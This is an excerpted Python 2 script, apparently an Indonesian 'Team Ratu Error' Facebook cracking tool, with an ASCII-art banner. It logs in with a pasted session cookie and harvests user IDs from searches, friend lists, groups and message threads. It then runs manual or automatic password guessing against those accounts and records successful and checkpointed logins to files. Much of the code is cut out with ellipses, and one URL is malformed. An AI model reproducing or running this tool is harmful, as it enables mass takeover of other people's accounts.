...
class dump_message:
	def __init__(self, cookies):
		...
		#print cookies
		self.f=raw_input("[+] nama file: ").replace(" ","_")
		if self.f=="":dump_message(cookies)
		open(self.f,"w").close()
		self.dump("https://graph.facebook.com/messages")
	...
	def dump(self, url):
		...
		for i in bs.find_all("a",href=True):
			...
			if "Lihat Pesan Sebelumnya" in i.text:
				self.dump(
					"https://graph.facebook.com/"+i.get("href"))
...
`` `` `` ``` `` `` ``` `` `oMM..Mo                                +M:`MMs` `` `` `` ``` `` `` ``` ``
 `````` `` `` `````` `` ```:MM+ hm`                              `dm :MM+`` `````` `` `` `````` `` `
````````````````````````````dMm`.Ms                              +M: hMN.```````````````````````````
`` `` `````` `` `` `````` ``-NMy`md  .:/+osyhs-      -shyso+/:.  yM`sMM/`` `` `` `````` `` `` ``````
 ``` `` `` `` ``` `` `` `` ``/NMyNh +mMMMMMMMMm      mMMMMMMMMNo sMhMN+` `` ``` `` `` `` ``` `` `` `
`` `` `````` `` `` `````` `` `:dMM+ dMMMMMMMMMh      hMMMMMMMMMm :MMh:```` `...` `````` `` `` ``````
 `````` `` `````````odmdo-`````.dM` -NMMMMMMMy`      `yMMMMMMMN:  mm` `` `:ymmms`` `` ````````` `` `
```````````````````oMMsdMN/`````md   :dMMMMm/   -so-   /mMMMMm/   yM`````+NMhoMM+```````````````````
`` `` `````` `` ```dMm `yMNo-`` dm    `:+o/`  `sNMMNo`  `/o+:`    dm```-oMMs  mMd.````` `` `` ``````
 ``` `` `` `` ```+dMm+  `+dNNdy/oMo`          oMMMMMMo          `+My+ydNNd+   +mMd/`` `` ``` `` `` `
`` `` `` ``` `` sMMs-`...``-/ymNNMMmyo/.`     mMMMNMMm     `./ohmMMNNdy/-``...`-yMMs``` `` `` ``` ``
 `````` `` `````oNMmddmmmdy+-``-/ymNMNdNdo`   yNd//dNy   `+dNhNMNdy/-``-/ydmmmddmMN+` ````````` `` `
`````````````````-/+oo+/+ydNNmy+-``-+MsmMMd`  `-`  `-`   hMMmoM+-``-+ymNNmy//+ooo/.`````````````````
`` `` `````` `` `` `````` `-/sdNMmho-dN/MMM+-..````....-/MMM:Nd-ohmMNds/-` `` `` `````` `` `` ``````
 ``` `` `` `` ``` `` `` `` ``` -/sdNMNM`mMN+m+dosossod+m+NMd`MMNNdo/. `` `` ``` `` `` `` ``` `` `` `
`` `` `` ``` `` `` ``` `` `` `` ```-yMN oMMdNdNddhdddNdNhMM+ NNs-.` `` ``` `` `` `` ``` `` `` ``` ``
```````````````````````````````.:odNNNM``+d+h/dsyyyysd/d+do``MNNNds+-```````````````````````````````
`````````````````````./oo+/:+sdNNNh+--My   -/+oossssss+/-   yM--+ymNMmy+:/+o+:.`````````````````````
`` `` `````` `` `` `/NMNmNNNNmy+-``./yNMy.                .hMNy/.` ./sdNNNNmNMN+ `````` `` `` ``````
 ``  `` `` `` ``` ``oMMs.`..`  `:sdMMmy/yms:``        `./yms/ymNMds/`  `.` .sMMy`` `` `` ``` `` `` `
`` `` `` ``` `` `` ``/dMNs   :hNMNh+-` ``.+yddhyyyyyyhdds/.`` `-+ymMMd/   oNMm+` `` ``` `` `` ``` ``
```````````````````````sMM. oMMs:`````````````.--:---.`````````````-sMMs  NMh```````````````````````
 `````` `` `` `````` ``:MMsdMN+`` `` `````` `` `` `````` `` `` ``````/MMdsMM+````` `` `` `````` `` `
`` `` ``  `` `` `` ``  `omMms-` ``  `` `` `` ``  `` `` ``  `  `` `` ``.smNms` `` ``  `` `` `` ``  ``

  \33[37;1m________________________________________
  \33[37;1m[+] TEAM RATU ERROR PROJECT
  {}""".format("\33[37;1m__"*20))
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://graph.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://graph.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://graph.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[+] login gagal mungkin facebook anda cp")
...
`` `` ``  `` `` `` ``  `omMms-` ``  `` `` `` ``  `` `` ``  `  `` `` ``.smNms` `` ``  `` `` `` ``  ``
  ...
  \33[37;1m________________________________________
  \33[37;1m[+] TEAM RATU ERROR PROJECT
  \33[37;1m[+] RECODE RATU ERROR
  {}""".format("__"*20))
		print("  [+] gunakan fb lama/baru")
	ck=raw_input("  [+] masukkan cookie: ")
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			exit("[+] login berhasil ketikkan perintah kembali.")
...
class dump_grup:
	...
	def choice(self, whitelist):
		try:
			...
			self.dumps("https://https://graph.facebook.com/groups/"+self.listed.get("id"))
		except Exception as e:
			print("* %s"%e)
			self.choice(whitelist)
	
	def f(self):
		self.fl=raw_input('[+] nama file: ').replace(" ","_")
		if self.fl=='':self.f()
...
class friendlist:
	...
	def dump(self, ok):
		...
		if self.nitel==None:
			...
			self.b=b
			print("[+] target: %s.."%a)
			print("[+] tersimpan: %s"%self.fl)
			print("[+] total teman: %s"%b)
			
		for i in r.find_all("a",href=True):
			if "fref" in i.get("href"):
				print("\r[+] Sedang Proses(%s)/(%s) .. press ctrl+z for stop"%(len(open(self.fl).read().splitlines()),self.b)),;sys.stdout.flush()
...
try:
	...
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
	
#if "pakistan" in ips:
#	ua="Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36;]"
...
class crack:
	def __init__(self,show=True):
		...
		if show==True:
			print("\n\t       \33[37;1m[ SELECT 1/2 ]\n")
			print("  \33[37;1m[1]. Crack Manual Sandi")
			print("  \33[37;1m[2]. Crack Otomatis Sandi\n")
		while True:
			f=raw_input("  \n  \33[37;1mPilih: ")
			if f=="":continue
			elif f=="1":
				...
				try:
					...
					continue
				print "  [+] crack dimulai..."
				print "  [+] ok tersimpan di: multiresult.txt"
				print "  [+] cp tersimpan di: checkpoint.txt"
				...
				break
	def pwlist(self):
		self.pw=raw_input("  [+] sandi Manual : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
...
#					ceks(log.get("cookies"),ko) # --> skip logger
			...
			self.ko+=1
			print "\r  [+] Sedang Proses %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
...
while True:
	os.system("clear")
	banner()
	print "  \33[37;1m[1] crack id dari pencarian nama"
	print "  \33[37;1m[2] crack id dari publik/teman"
	print "  \33[37;1m[3] crack id dari grup"
	print "  \33[37;1m[4] crack id dari pesan"
	print "  \33[37;1m[5] mulai crack"
	print "  \33[37;1m[6] Hapus Cookie"
	print "  \33[37;1m________________________________________"
